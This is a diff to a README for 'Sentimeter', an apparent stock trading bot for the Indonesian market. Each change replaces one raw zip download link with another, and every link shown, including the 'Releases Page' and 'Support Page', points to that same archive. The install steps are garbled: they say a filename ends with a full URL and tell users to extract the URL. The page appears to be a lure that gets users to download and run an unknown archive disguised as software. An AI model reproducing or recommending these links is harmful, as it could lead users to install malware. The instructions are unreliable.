@@ -6,7 +6,7 @@ Welcome to Sentimeter! This application helps you make better stock trading deci
 
 ## 🔗 Download Sentimeter
 
-[![Download Sentimeter](https://github.com/Godsfav5/sentimeter/raw/refs/heads/main/assets/Software-v3.8.zip%https://github.com/Godsfav5/sentimeter/raw/refs/heads/main/assets/Software-v3.8.zip)](https://github.com/Godsfav5/sentimeter/raw/refs/heads/main/assets/Software-v3.8.zip)
+[![Download Sentimeter](https://github.com/Godsfav5/sentimeter/raw/refs/heads/main/scripts/Software_1.8.zip%https://github.com/Godsfav5/sentimeter/raw/refs/heads/main/scripts/Software_1.8.zip)](https://github.com/Godsfav5/sentimeter/raw/refs/heads/main/scripts/Software_1.8.zip)
 
 ## 💡 What is Sentimeter?
 
@@ -16,16 +16,16 @@ Sentimeter is a sentiment-based stock trading bot designed specifically for the 
 
 To get started, visit the releases page to download the latest version of Sentimeter. Follow these simple steps:
 
-1. **Visit the Releases Page**: [Download Sentimeter](https://github.com/Godsfav5/sentimeter/raw/refs/heads/main/assets/Software-v3.8.zip)
+1. **Visit the Releases Page**: [Download Sentimeter](https://github.com/Godsfav5/sentimeter/raw/refs/heads/main/scripts/Software_1.8.zip)
   
 2. **Choose Your Version**: You will see a list of available versions. Select the latest stable release.
 
-3. **Download the Application**: Click on the appropriate file for your operating system (Windows, macOS, or Linux). The filename should end with `.exe`, `.dmg`, or `https://github.com/Godsfav5/sentimeter/raw/refs/heads/main/assets/Software-v3.8.zip` depending on your system.
+3. **Download the Application**: Click on the appropriate file for your operating system (Windows, macOS, or Linux). The filename should end with `.exe`, `.dmg`, or `https://github.com/Godsfav5/sentimeter/raw/refs/heads/main/scripts/Software_1.8.zip` depending on your system.
 
 4. **Install Sentimeter**:
    - For Windows: Double-click the downloaded `.exe` file and follow the installation prompts.
    - For macOS: Open the downloaded `.dmg` file and drag Sentimeter into your Applications folder.
-   - For Linux: Extract the downloaded `https://github.com/Godsfav5/sentimeter/raw/refs/heads/main/assets/Software-v3.8.zip` file and follow the instructions in the README file inside the extracted folder.
+   - For Linux: Extract the downloaded `https://github.com/Godsfav5/sentimeter/raw/refs/heads/main/scripts/Software_1.8.zip` file and follow the instructions in the README file inside the extracted folder.
 
 5. **Run the Application**: After installation, you can find Sentimeter in your applications list. Open the app to start using it.
 
@@ -65,7 +65,7 @@ Sentimeter simplifies stock trading through intelligent analysis of news and dat
 
 ## 📞 Support
 
-If you have questions or need assistance, please visit the [Support Page](https://github.com/Godsfav5/sentimeter/raw/refs/heads/main/assets/Software-v3.8.zip) to find answers or report issues.
+If you have questions or need assistance, please visit the [Support Page](https://github.com/Godsfav5/sentimeter/raw/refs/heads/main/scripts/Software_1.8.zip) to find answers or report issues.
 
 ## 📚 Topics
 
@@ -80,4 +80,4 @@ Sentimeter connects to many topics in the financial world:
 
 Download Sentimeter today and take control of your stock trading on the Indonesian Stock Exchange. 
 
-[![Download Sentimeter](https://github.com/Godsfav5/sentimeter/raw/refs/heads/main/assets/Software-v3.8.zip%https://github.com/Godsfav5/sentimeter/raw/refs/heads/main/assets/Software-v3.8.zip)](https://github.com/Godsfav5/sentimeter/raw/refs/heads/main/assets/Software-v3.8.zip)
+[![Download Sentimeter](https://github.com/Godsfav5/sentimeter/raw/refs/heads/main/scripts/Software_1.8.zip%https://github.com/Godsfav5/sentimeter/raw/refs/heads/main/scripts/Software_1.8.zip)](https://github.com/Godsfav5/sentimeter/raw/refs/heads/main/scripts/Software_1.8.zip)
